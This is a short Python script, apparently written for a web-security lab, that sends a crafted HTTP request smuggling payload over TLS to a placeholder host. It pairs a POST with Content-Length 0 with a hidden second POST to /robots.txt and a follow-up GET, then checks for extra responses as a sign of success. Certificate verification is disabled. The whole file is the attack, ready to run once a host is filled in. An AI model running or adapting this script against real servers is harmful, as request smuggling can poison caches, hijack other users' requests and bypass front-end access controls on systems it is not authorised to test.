import socket
import ssl

host = "enter host here"  # ← Replace this with the real host
port = 443

# First request: main request + smuggled request (CL.CL style attempt)
first_request = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 0\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "POST /robots.txt HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 20\r\n"
    "\r\n"
    "abc"
)

# Second request
second_request = (
    "GET / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Connection: close\r\n"
    "\r\n"
)

# Create insecure SSL context (for lab testing)
context = ssl._create_unverified_context()

with socket.create_connection((host, port)) as sock:
    with context.wrap_socket(sock, server_hostname=host) as ssock:
        print("[+] Sending the requests...")

        # Send both requests over the same connection
        ssock.sendall(first_request.encode())
        ssock.sendall(second_request.encode())

        # Read full response
        response_data = b""
        ssock.settimeout(2)
        try:
            while True:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                response_data += chunk
        except socket.timeout:
            pass

        # Decode and split responses
        full_response = response_data.decode(errors="ignore")
        parts = full_response.split("HTTP/1.1 ")

        if len(parts) < 3:
            print("\n❌ Smuggled request did NOT go through — only one response received.")
            print("\n🧪 Full server response for debugging:\n")
            print(full_response[:1500])  # Print first 1500 chars for context
        else:
            print(f"\n✅ Received {len(parts) - 1} HTTP responses — possible smuggling success!")

            for idx, part in enumerate(parts[1:], start=1):
                print(f"\n---------------- Response #{idx} ----------------")
                print("HTTP/1.1 " + part[:600])  # Print first 600 chars per response
